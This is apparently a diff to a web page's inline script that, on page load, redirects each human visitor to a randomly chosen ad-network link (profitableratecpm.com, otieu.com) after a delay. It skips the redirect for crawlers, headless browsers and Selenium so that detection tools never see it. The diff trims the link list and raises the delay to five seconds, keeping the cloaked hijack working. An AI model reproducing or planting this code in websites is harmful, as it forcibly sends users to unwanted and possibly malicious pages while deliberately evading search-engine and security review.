@@ -16,13 +16,22 @@
     @media (max-width: 768px) { .banner-left, .banner-right { display: none; } }
   </style>
   <script>
-    const enlaces = ['https://otieu.com/4/9621091', 'https://otieu.com/4/9621653', 'https://www.profitableratecpm.com/tg4925wu?key=881390cc73acb2dbf7ed411d47708805', 'https://www.profitableratecpm.com/xx7ibrgyi?key=a8aa9790d03d9bfd081929c3c148c6d1', 'https://otieu.com/4/9621654', 'https://otieu.com/4/9621655', 'https://www.profitableratecpm.com/neq9w7sef9?key=0682f9ae891948142ca9260cfb5ec0c1', 'https://www.profitableratecpm.com/t2k4tnyf?key=aba58ed48b66bc5a6e374942591d33a5', 'https://otieu.com/4/9621656', 'https://otieu.com/4/9621657', 'https://www.profitableratecpm.com/rpq0x5ej?key=97c312661be172c94077f6a286c1ed36', 'https://www.profitableratecpm.com/wjbss4zx7?key=6d88c719ff675759a335027b0f0502f7', 'https://otieu.com/4/9621658', 'https://otieu.com/4/9621659', 'https://www.profitableratecpm.com/jusfm502?key=60c21f31735bc8ae768931453888194d', 'https://www.profitableratecpm.com/uk3nx96ewa?key=612ef9f7dcda7a5eb45b3c069c7104d3', 'https://otieu.com/4/9621660', 'https://otieu.com/4/9621662', 'https://www.profitableratecpm.com/z9w7v98yrd?key=487675e67f4ba23a2c38673be2aa3358', 'https://www.profitableratecpm.com/v26dt4b3?key=cc596ac56ef93c8523d71c6042f978e5'];
+    const enlaces = ['https://www.profitableratecpm.com/tg4925wu?key=881390cc73acb2dbf7ed411d47708805', 
+'https://www.profitableratecpm.com/xx7ibrgyi?key=a8aa9790d03d9bfd081929c3c148c6d1', 
+'https://www.profitableratecpm.com/neq9w7sef9?key=0682f9ae891948142ca9260cfb5ec0c1', 
+'https://www.profitableratecpm.com/t2k4tnyf?key=aba58ed48b66bc5a6e374942591d33a5', 
+'https://www.profitableratecpm.com/rpq0x5ej?key=97c312661be172c94077f6a286c1ed36', 
+'https://www.profitableratecpm.com/wjbss4zx7?key=6d88c719ff675759a335027b0f0502f7', 
+'https://www.profitableratecpm.com/jusfm502?key=60c21f31735bc8ae768931453888194d', 
+'https://www.profitableratecpm.com/uk3nx96ewa?key=612ef9f7dcda7a5eb45b3c069c7104d3', 
+'https://www.profitableratecpm.com/z9w7v98yrd?key=487675e67f4ba23a2c38673be2aa3358', 
+'https://www.profitableratecpm.com/v26dt4b3?key=cc596ac56ef93c8523d71c6042f978e5'];
     const bots = ["bot", "crawl", "spider", "slurp", "headless", "phantomjs", "selenium"];
     const isBot = bots.some(bot => navigator.userAgent.toLowerCase().includes(bot));
     function redireccionar() {
       if (isBot) { console.log("Bot detectado."); return; }
       const enlace = enlaces[Math.floor(Math.random() * enlaces.length)];
-      setTimeout(() => { window.location.href = enlace; }, 2000);
+      setTimeout(() => { window.location.href = enlace; }, 5000);
     }
     window.onload = redireccionar;
   </script>
